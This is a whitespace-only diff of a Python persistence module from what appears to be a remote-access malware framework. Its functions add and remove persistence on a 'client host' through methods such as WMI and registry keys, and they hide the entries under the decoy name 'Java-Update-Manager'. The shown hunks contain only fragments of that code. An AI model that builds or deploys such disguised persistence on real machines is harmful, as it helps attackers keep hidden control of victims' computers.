@@ -25,7 +25,7 @@ platforms = ['win32','linux2','darwin']
 results = {}
 usage = 'persistence [method] <add/remove>'
 description = """
-Establish persistence on the client host machine 
+Establish persistence on the client host machine
 with multiple methods to ensure redundancy
 """
 
@@ -86,7 +86,7 @@ class Method():
         [util.__logger__.warn("required method '_{}_{}' not found".format(_, self.name)) for _ in ('add','remove') if '_{}_{}'.format(_, self.name) not in globals()]
 
     def add(self):
-        """ 
+        """
         Attempt to establish persistence using the given method
 
         """
@@ -97,7 +97,7 @@ class Method():
             raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
 
     def remove(self):
-        """ 
+        """
         Remove an established persistence method from the host machine
 
         """
@@ -305,7 +305,7 @@ def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
     except Exception as e:
         util.log('{} error: {}'.format(_add_powershell_wmi.func_name, str(e)))
     return (_methods['powershell_wmi'].established, _methods['powershell_wmi'].result)
-    
+
 def _remove_registry_key(value=None, name='Java-Update-Manager'):
     try:
         if _methods['registry_key'].established:
@@ -363,7 +363,7 @@ def methods():
     return globals()['_methods'].items()
 
 def results():
-    """ 
+    """
     Results of completed persistence methods as dictionary (JSON) object of key-value pairs
 
     Ex. {"method": "result", ...}
@@ -383,7 +383,7 @@ def run():
             except Exception as e:
                 util.log(e)
     return results()
-    
+
 def abort():
     """
     Remove all established persistence methods
